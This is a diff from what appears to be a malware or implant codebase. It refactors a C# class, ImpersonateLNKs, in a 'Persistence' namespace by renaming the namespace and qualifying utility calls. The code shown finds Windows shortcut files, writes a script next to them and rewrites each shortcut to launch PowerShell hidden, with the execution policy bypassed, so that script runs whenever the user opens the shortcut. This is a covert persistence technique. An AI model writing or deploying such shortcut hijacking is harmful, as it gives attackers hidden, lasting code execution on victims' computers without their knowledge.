@@ -1,6 +1,6 @@
 ﻿using System.Text;
 
-namespace Main.Source.Utilities.Persistence
+namespace Main.Source.Functions.Persistence
 {
     public class ImpersonateLNKs
     {
@@ -19,13 +19,13 @@ namespace Main.Source.Utilities.Persistence
             var links = FindLNKs();
             if (links.Count == 0)
             {
-                Logger.Warn("ImpersonateLNKs.Install: there are no link files");
+                Utilities.Logger.Warn("ImpersonateLNKs.Install: there are no link files");
                 return;
             }
 
             foreach (var link in links)
             {
-                var info = Shortcut.GetShortcutInfo(link);
+                var info = Utilities.Shortcut.GetShortcutInfo(link);
                 if (info == null)
                 {
                     continue;
@@ -41,7 +41,7 @@ namespace Main.Source.Utilities.Persistence
 
                 File.WriteAllText(scriptPath, content.ToString());
 
-                Shortcut.OverwriteShortcut(
+                Utilities.Shortcut.OverwriteShortcut(
                     Path.GetFullPath(link),
                     target: $"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \"{scriptPath}\"",
                     openIn: shortcutsFolderPath
@@ -64,7 +64,7 @@ namespace Main.Source.Utilities.Persistence
                 return 0;
             }
 
-            return Files.CountFiles(shortcutsFolderPath);
+            return Utilities.Files.CountFiles(shortcutsFolderPath);
         }
 
         private static List<string> FindLNKs()
